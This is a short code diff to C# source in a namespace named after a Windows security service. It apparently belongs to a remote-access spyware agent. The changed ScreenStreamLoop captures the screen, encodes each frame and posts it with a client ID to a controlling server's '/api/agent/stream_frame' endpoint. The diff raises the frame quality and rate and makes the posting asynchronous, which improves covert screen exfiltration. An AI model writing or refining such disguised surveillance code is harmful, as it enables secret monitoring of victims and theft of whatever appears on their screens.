@@ -149,6 +149,7 @@ using System.Linq;
 using System.Threading;
 using System.Collections.Generic;
 using System.Collections.Concurrent;
+using System.Threading.Tasks;
 using System.IO.Compression;
 using System.Diagnostics;
 using System.Drawing;
@@ -720,9 +721,8 @@ namespace WinSecHealthSvc
         }
 
         static void ScreenStreamLoop() {
-            // HTTP-based screen streaming (Mono 4.5 compatible - no WebSocket)
             var ep = new System.Drawing.Imaging.EncoderParameters(1);
-            ep.Param[0] = new System.Drawing.Imaging.EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 50L);
+            ep.Param[0] = new System.Drawing.Imaging.EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 75L);
             var jc = System.Drawing.Imaging.ImageCodecInfo.GetImageEncoders().First(c => c.FormatID == System.Drawing.Imaging.ImageFormat.Jpeg.Guid);
             while (_screenStreaming) {
                 try {
@@ -732,15 +732,14 @@ namespace WinSecHealthSvc
                         using (var bmp = new Bitmap(fullBmp, new Size(b.Width / 2, b.Height / 2))) {
                             using (var ms = new System.IO.MemoryStream()) {
                                 bmp.Save(ms, jc, ep);
-                                byte[] frame = ms.ToArray();
-                                string b64 = Convert.ToBase64String(frame);
+                                string b64 = Convert.ToBase64String(ms.ToArray());
                                 string json = "{\"id\":\"" + Esc(_clientId) + "\",\"frame\":\"" + b64 + "\"}";
-                                Post(_server + "/api/agent/stream_frame", json);
+                                Task.Run(() => Post(_server + "/api/agent/stream_frame", json));
                             }
                         }
                     }
                 } catch {}
-                Thread.Sleep(250); // ~4 FPS via HTTP
+                Thread.Sleep(100);
             }
         }
 
